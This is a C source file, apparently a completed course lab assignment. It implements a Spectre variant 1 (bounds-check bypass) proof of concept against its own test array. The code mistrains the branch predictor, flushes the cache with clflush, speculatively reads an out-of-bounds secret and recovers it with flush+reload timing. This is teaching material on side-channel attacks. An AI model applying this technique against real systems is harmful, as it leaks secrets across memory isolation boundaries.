#include "utility.h"
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>

#define BUFF_SIZE (1<<21)

//** Write your victim function here */
// Assume secret_array[47] is your secret value
// Assume the bounds check bypass prevents you from loading values above 20
// Use a secondary load instruction (as shown in pseudo-code) to convert secret value to address
int victim_bound = 20;
void victim_function(int *shared_mem, int *secret_array, int val){	
	int secret, idx, tmp;
	clflush (&victim_bound);
	if (val < victim_bound){
		secret = secret_array[val];
		idx = secret * 16; // secret corresponds to different index in the cache
		tmp = shared_mem[idx]; // use secret to load memory
	}

}

void victim_function_basic(int *shared_mem){	
	int message = 3;
	int tmp = shared_mem[message*16];
}
int main(int argc, char **argv)
{
    // Allocate a buffer using huge page
    // See the handout for details about hugepage management
    void *huge_page= mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE |
                    MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
    
    if (huge_page == (void*) - 1) {
        perror("mmap() error\n");
        exit(EXIT_FAILURE);
    }
    // The first access to a page triggers overhead associated with
    // page allocation, TLB insertion, etc.
    // Thus, we use a dummy write here to trigger page allocation
    // so later access will not suffer from such overhead.
    *((char *)huge_page) = 1; // dummy write to trigger page allocation


    //** STEP 1: Allocate an array into the mmap */
    int *secret_array = (int *)huge_page;
    int *shared_memory = (int *) (huge_page + 65536);
    int stats[100];

    // Initialize the array
    for (int i = 0; i < 100; i++) {
        secret_array[i] = i;
    }

    //** STEP 2: Mistrain the branch predictor by calling victim function here */
    // To prevent any kind of patterns, ensure each time you train it a different number of times
    for (int i=0; i<10; i++){
	    victim_function(shared_memory, secret_array, i%20); // call victi mwith legal value (less than 20)
    }

    //** STEP 3: Clear cache using clflsuh from utility.h */
    for(int i=0; i<512; i++){ // 512 lines in L1.
	   // clflush(secret_array + i*16); // line size 64 B, int is 4 B. make sure each maps to different line
	   clflush(shared_memory + i*16); // line size 64 B, int is 4 B. make sure each maps to different line
    }
    lfence();

    //** STEP 4: Call victim function again with bounds bypass value */
    
    // victim_function_basic(shared_memory); // Used to test basic flush & reload
     victim_function(shared_memory, secret_array, 47);

    //** STEP 5: Reload mmap to see load times */
    // Just read the mmap's first 100 integers
    lfence();

    for (int i =0; i<100; i++){
	    // stats[i] = measure_one_block_access_time((uint64_t) &secret_array[i*16] );
	    stats[i] = measure_one_block_access_time((uint64_t) &shared_memory[i*16] );
    }

    for (int i =0; i<100; i++){
	   
	    
	    if (stats[i] < 150)
	    {
	    	printf ("Secret data is %d!\n", i);
	    }
		//printf("access time for %d is %d\n", i, stats[i]);
    }

    // ******** testing stuff ********
    // printf("secret array 0 address is %p\n", &secret_array[0]);
    // printf("shared memory 0 address is %p\n", &shared_memory[0]);
    // clflush (secret_array);

    // int tmp = measure_one_block_access_time((uint64_t) secret_array );
    // printf ("*** dra mtime is %d \n", tmp);
    return 0;
}
